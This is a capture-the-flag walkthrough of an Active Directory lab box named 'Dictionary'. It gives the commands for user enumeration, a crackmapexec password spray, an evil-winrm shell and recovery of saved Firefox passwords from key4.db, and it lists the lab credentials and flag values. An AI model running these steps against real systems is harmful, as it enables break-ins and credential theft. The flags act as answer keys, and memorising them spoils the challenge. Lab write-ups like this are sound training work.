# DICTIONARY / Active Directory

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/4fbaa63b5f7149a5831396f7ed032893.png)

## NMAP SCAN

```text
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-03-16 00:28:23Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: Dictionary.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: Dictionary.csl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DICTIONARY
|   NetBIOS_Domain_Name: DICTIONARY
|   NetBIOS_Computer_Name: DICTIONARY-DC
|   DNS_Domain_Name: Dictionary.csl
|   DNS_Computer_Name: Dictionary-DC.Dictionary.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-16T00:29:17+00:00
|_ssl-date: 2021-03-16T00:29:57+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

ADD Dictionary.csl in your /etc/hosts

## SMB ENUMERATION

* DEAD END

## LDAP ENUMERATION

* NOTHING INTERESTED

## KERBEROS ENUMERATION

### USER ENUMERATION

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/bdc4d05eabaf4a79bcc07e621aa85d48.png)

## GETTIN HASH & CRACK IT

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/646cf30c15cd4077a69a1d7e5693da90.png)

## ENUMERATE OTHERS DOMAIN USERS

```text
rpcclient -U "izabel" 172.31.3.4
enumdomusers
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/e9679b99e3da4d19a40d215b4d2c85e2.png)

```text
Administrator
Guest
krbtgt
Izabel
CValencia
BACKUP-Izabel
```

* USE EXREX TO MADE AN MONTH/YEAR LIST LIKE IZABEL \(MONTHYEAR\)

```text
https://github.com/asciimoo/exrex
```

## CRACKMAPEXEC BRUTEFORCE

```text
crackmapexec smb 172.31.3.4 -u name.txt -p pass.txt
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/dd3e8287efc141a4b187899473a8ec76.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/0983a71388a54129ae91f6e3fe856586.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/cd95cadbe8d5456eb02a9d5122c2cd27%20%281%29.png)

## GETTING A SHELL

```text
evil-winrm -i 172.31.3.4 -u 'BACKUP-Izabel' -p 'October2019'
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/efe5184d547647ddbed51b83db3343eb.png)

### WINPEAS

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/40af7cb5409742ada6b9c8099c08a088.png)

```text
C:\Users\BACKUP-Izabel\AppData\Roaming\Mozilla\Firefox\Profiles\65wr35iv.default-release\key4.db
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/9e93e4335b8140fd84ba1fc1e30e3005.png)

## RETRIEVING PASSWORDS FIREPWD

* [https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)

```text
python3 /opt/firepwd/firepwd.py key4.db
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/88a3481d5e3f468ea2d21aecd9ab161e.png)

```text
iHgPVQivZw7wpEd
iAmRoot
LUp2KhdP
NotADuck
x7VtnCWZ
EpicL_yep
kC7pbrQAsTT
```

## CHECKING THIS PASSWORDS

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/afa8b9e67b1a431d97ec500addd25753.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/92ed63bf7ff14d978766b4c760761417.png)

## CREDS

```text
izabel:June2013
BACKUP-Izabel:October2019
Administrator:kC7pbrQAsTT
```

## FLAGS

### USER

```text
44d83b9985749480f7dd57f23e72c851
```

### ROOT

```text
5f10b45e7f64ce852e6e0ac0eda224ff
```


